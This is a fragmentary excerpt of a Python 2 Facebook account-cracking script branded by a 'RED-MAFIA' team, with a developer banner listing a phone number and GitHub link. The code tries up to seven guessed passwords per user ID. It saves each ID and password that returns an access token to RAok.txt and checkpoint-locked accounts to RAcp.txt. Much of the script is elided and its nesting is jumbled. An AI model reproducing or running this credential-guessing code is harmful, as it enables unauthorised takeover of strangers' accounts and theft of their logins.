...
#!/usr/bin/python2
#coding=utf-8
#originally written ANEEX RXJX ( TEAM OF RED-MAFIA)
try:
...
logo = """
 ...
 |_|  \_\______|_____/           |_|  |_/_/    \_\_|    |_____/_/    \_\
                                                                        
                                                                        
 
\033[1;93m-----------------------------------------------------
 \033[1;93m(*)\033[1;92m Developer: (ANEEX RXJX TEAM RED-MAFIA)
 \033[1;93m(*)\033[1;92m WhatsApp :   +923156675789
 \033[1;93m(*)\033[1;92m Github   : https://github.com/Aneex12
\033[1;93m-----------------------------------------------------
"""
def tool():
	os.system("clear")
...
def crack_select():
	...
	if select =="1":
		...
		try:
			...
			print(logo)
			print('')
			print("  ANEEX RXJX TEAM OF RED-MAFIA START CRACKING.....")
			print('')
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [RA-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("RAok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [RA-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("RAcp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [RA-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("RAok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [RA-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("RAcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [RA-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("RAok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [RA-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("RAcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [RA-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("RAok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [RA-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("RAcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [RA-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("RAok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [RA-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("RAcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;32m [RA-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("RAok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [RA-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("RAcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [RA-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("RAok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [RA-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("RAcp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
											...
											if "access_token" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [RA-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("RAcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
